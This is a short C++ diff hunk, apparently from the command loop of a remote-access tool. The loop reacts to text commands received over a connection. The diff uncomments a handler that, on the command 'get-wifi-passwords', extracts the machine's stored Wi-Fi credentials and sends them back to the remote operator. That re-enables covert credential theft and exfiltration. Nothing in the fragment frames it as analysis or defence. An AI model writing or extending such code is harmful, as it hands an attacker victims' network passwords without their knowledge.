@@ -199,11 +199,11 @@ public:
 			if (recvBuffer == "closeconn") {
 				kill = true;
 			}
-			/*if (recvBuffer == "get-wifi-passwords") {
+			if (recvBuffer == "get-wifi-passwords") {
 				WifiExtractor* wf = new WifiExtractor();
 				std::string creds = wf->getCreds();
 				sendData(creds);
-			}*/
+			}
 		}
 		return;
 	}
